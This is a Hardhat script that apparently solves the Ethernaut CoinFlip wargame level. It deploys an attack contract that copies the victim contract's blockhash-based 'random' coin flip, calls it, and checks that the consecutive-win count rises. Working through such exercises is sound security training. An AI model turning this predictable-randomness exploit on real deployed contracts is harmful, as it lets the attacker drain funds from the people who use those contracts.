const hre = require("hardhat");

async function main() {
  // First get victim contract to call consecutiveWins public variable
  const Victim = await ethers.getContractFactory("CoinFlip");
  const victim = await Victim.attach(
    "0x96037972C4De46567Df2652A7649674C2D6D180f" // This is the contract address that you get from starting your instance
  );

  // This is for the attacking contract
  const MyContract = await ethers.getContractFactory("CoinFlipAttack");

  // Deploy contract
  const contract = await MyContract.deploy(
    "0x96037972C4De46567Df2652A7649674C2D6D180f" // This is the contract address that you get from starting your instance
  );
  await contract.deployed();

  console.log(`Deployed contract to: ${contract.address}`);

  // We can check that the variable consecutive wins is 0 in the beginning
  const wins1 = await victim.consecutiveWins();
  console.log("The number of right guesses initially is ", wins1.toString());

  // Now we can call the malicious function that mimics the logic to get the random number
  const attack1 = await contract.flip();
  await attack1.wait(1); // We have to wait a block number to pass the if statement in the victim contract
  // Verify that you have rightly guessed
  const wins2 = await victim.consecutiveWins();
  console.log("The number of right guesses now is ", wins2.toString()); // see that the value has increased

  // Repeat this process 10 extra times
  // const attack2 = await contract.flip();
  // await attack2.wait(1);

  // Calling the flip function 10 times in the script might retrieve a gas error
  // Therefore it is better to run the script 10 times
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
